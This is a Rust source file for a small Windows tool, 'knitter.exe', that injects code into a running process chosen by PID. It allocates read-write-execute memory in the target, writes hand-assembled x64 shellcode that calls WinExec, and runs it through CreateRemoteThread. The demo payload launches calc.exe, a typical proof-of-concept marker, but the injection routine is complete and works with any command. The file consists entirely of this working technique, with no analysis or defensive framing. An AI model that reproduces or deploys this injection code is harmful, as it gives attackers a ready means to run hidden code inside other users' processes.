use windows::Win32::Foundation::*;
use windows::Win32::System::Memory::*;
use windows::Win32::System::Threading::*;
use windows::Win32::System::LibraryLoader::*;
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use std::env;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        println!("usage: knitter.exe <PID>");
        return Ok(());
    }
    let target_pid: u32 = args[1].parse()?;

    unsafe {
        let h_proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)?;

        let winexec = GetProcAddress(
            GetModuleHandleW(windows::core::w!("kernel32.dll"))?, 
            windows::core::s!("WinExec")
        ).expect("Failed to find WinExec") as u64;

        let cmd = "calc.exe\0";
        let remote_str = VirtualAllocEx(h_proc, None, cmd.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if remote_str.is_null() {
            return Err("failed to allocate string memory.".into());
        }
        WriteProcessMemory(h_proc, remote_str, cmd.as_ptr() as _, cmd.len(), None)?;

        let mut sc = vec![
            0x48, 0x83, 0xec, 0x28,           
            0x48, 0xb9,                       
        ];
        sc.extend_from_slice(&(remote_str as u64).to_le_bytes());
        sc.extend_from_slice(&[0xba, 0x05, 0x00, 0x00, 0x00]); 
        sc.extend_from_slice(&[0x48, 0xb8]);                   
        sc.extend_from_slice(&winexec.to_le_bytes());
        sc.extend_from_slice(&[0xff, 0xd0]);                  
        sc.extend_from_slice(&[0x48, 0x83, 0xc4, 0x28]);       
        sc.extend_from_slice(&[0xc3]);                        

        let remote_code = VirtualAllocEx(h_proc, None, sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if remote_code.is_null() {
            return Err("failed to allocate code memory.".into());
        }
        WriteProcessMemory(h_proc, remote_code, sc.as_ptr() as _, sc.len(), None)?;

        println!("[+] shellcode written to: {:?}", remote_code);

        let h_exec = CreateRemoteThread(h_proc, None, 0, Some(std::mem::transmute(remote_code)), None, 0, None)?;
        
        if !h_exec.is_invalid() {
            println!("[!] thread created. calc should appear.");
            let _ = CloseHandle(h_exec);
        }

        let _ = CloseHandle(h_proc);
    }
    Ok(())
}